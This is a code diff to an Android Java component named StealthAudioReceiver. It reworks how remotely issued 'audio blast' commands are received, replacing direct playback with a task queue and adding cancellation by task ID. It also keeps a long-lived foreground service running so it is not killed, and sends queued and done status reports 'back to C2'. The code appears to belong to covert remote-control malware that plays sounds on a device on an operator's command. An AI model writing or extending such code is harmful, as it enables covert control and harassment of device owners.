@@ -129,51 +129,90 @@ public class StealthAudioReceiver extends BroadcastReceiver {
                 }
 
                 String deviceId = intent.getStringExtra("device_id");
-
-                Log.i(TAG, "Starting audio blast via ForegroundService: type=" + type + " volume=" + volume + " loops=" + loops + " device=" + deviceId);
-
-                serviceIntent.putExtra("action", "play");
-                serviceIntent.putExtra("type", type);
-                serviceIntent.putExtra("volume", volume);
-                serviceIntent.putExtra("loops", loops);
-                if (deviceId != null) serviceIntent.putExtra("device_id", deviceId);
-
+                long taskId = 0;
                 try {
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    // Accept integer or long extras sent by adb (--ei) or the reporter (--el)
+                    if (intent.hasExtra("task_id")) {
+                        Object obj = intent.getExtras().get("task_id");
+                        if (obj instanceof Long) taskId = ((Long)obj).longValue();
+                        else if (obj instanceof Integer) taskId = ((Integer)obj).longValue();
+                        else if (obj instanceof String) {
+                            try { taskId = Long.parseLong((String)obj); } catch (Exception ignored) {}
+                        } else {
+                            taskId = intent.getLongExtra("task_id", 0);
+                        }
+                    }
+                } catch (Exception e) {
+                    // Fallback to getLongExtra for safety
+                    taskId = intent.getLongExtra("task_id", 0);
+                }
+
+                Log.i(TAG, "Enqueueing audio task: type=" + type + " volume=" + volume + " loops=" + loops + " device=" + deviceId + " taskId=" + taskId);
+
+                // NEW: Enqueue task instead of playing directly
+                PlaybackTask task = PlaybackQueue.enqueueTask(taskId, type, volume, loops);
+                
+                if (task != null) {
+                    Log.d(TAG, "Task enqueued: " + task.taskId + ". Queue size: " + PlaybackQueue.getQueueSize());
+                    
+                    // Report queued status back to C2
+                    try {
+                        String json = "{\"event\":\"audio_task_queued\"," +
+                                     "\"task_id\":" + task.taskId + "," +
+                                     "\"type\":" + task.type + "," +
+                                     "\"volume\":" + task.volume + "," +
+                                     "\"status\":\"pending\"}";
+                        LocalSocketReporter.send(json);
+                    } catch (Exception e) {
+                        Log.e(TAG, "Failed to report task queued", e);
+                    }
+
+                    // Ensure consumer is running in a long-lived service so it won't be killed
+                    serviceIntent.putExtra("action", "start_consumer");
+                    try {
                         appContext.startForegroundService(serviceIntent);
-                    } else {
-                        appContext.startService(serviceIntent);
+                    } catch (Exception e) {
+                        // Fallback: start consumer directly if service start fails
+                        Log.w(TAG, "Foreground service start failed, starting consumer directly", e);
+                        PlaybackQueue.startConsumer(appContext);
                     }
                     pendingResult.finish();
-                } catch (Exception startException) {
-                    logError(context, "Service start failed, falling back to direct playback", startException);
-                    final Context playbackContext = appContext;
-                    final int playbackType = type;
-                    final float playbackVolume = volume;
-                    final int playbackLoops = loops;
-                    final String playbackDeviceId = deviceId;
-                    new Thread(new Runnable() {
-                        @Override
-                        public void run() {
-                            try {
-                                reportAudioEvent(playbackContext, playbackDeviceId, playbackType, "audio_started");
-                                StealthAudio.playSound(playbackContext, playbackType, playbackVolume, playbackLoops);
-                            } catch (Exception playbackException) {
-                                logError(playbackContext, "Direct playback failed", playbackException);
-                            } finally {
-                                reportAudioEvent(playbackContext, playbackDeviceId, playbackType, "audio_done");
-                                pendingResult.finish();
-                            }
-                        }
-                    }, "sa-direct-playback").start();
+                } else {
+                    logError(context, "Failed to enqueue task - queue full", null);
+                    pendingResult.finish();
                 }
 
             } else if ("stop".equals(action)) {
                 String deviceId = intent.getStringExtra("device_id");
-                Log.i(TAG, "Stopping audio blast via BroadcastReceiver device=" + deviceId);
-                StealthAudio.stopPlayback();
-                // FIX C-5: always report audio_done when a stop command arrives.
-                // Previous logic was inverted — it only reported when nothing was playing.
+                long taskId = 0;
+                try {
+                    if (intent.hasExtra("task_id")) {
+                        Object obj = intent.getExtras().get("task_id");
+                        if (obj instanceof Long) taskId = ((Long)obj).longValue();
+                        else if (obj instanceof Integer) taskId = ((Integer)obj).longValue();
+                        else if (obj instanceof String) {
+                            try { taskId = Long.parseLong((String)obj); } catch (Exception ignored) {}
+                        } else {
+                            taskId = intent.getLongExtra("task_id", 0);
+                        }
+                    }
+                } catch (Exception ignored) {
+                    taskId = intent.getLongExtra("task_id", 0);
+                }
+                
+                Log.i(TAG, "Audio stop command: device=" + deviceId + " taskId=" + taskId);
+                
+                if (taskId == 0) {
+                    // Stop all: clear queue and stop current playback
+                    Log.d(TAG, "Clearing all audio tasks");
+                    PlaybackQueue.clearAll();
+                } else {
+                    // Cancel specific task
+                    Log.d(TAG, "Cancelling specific task: " + taskId);
+                    PlaybackQueue.cancelTask(taskId);
+                }
+                
+                // Report status
                 if (deviceId != null && !deviceId.isEmpty()) {
                     reportAudioEvent(appContext, deviceId, 0, "audio_done");
                 }
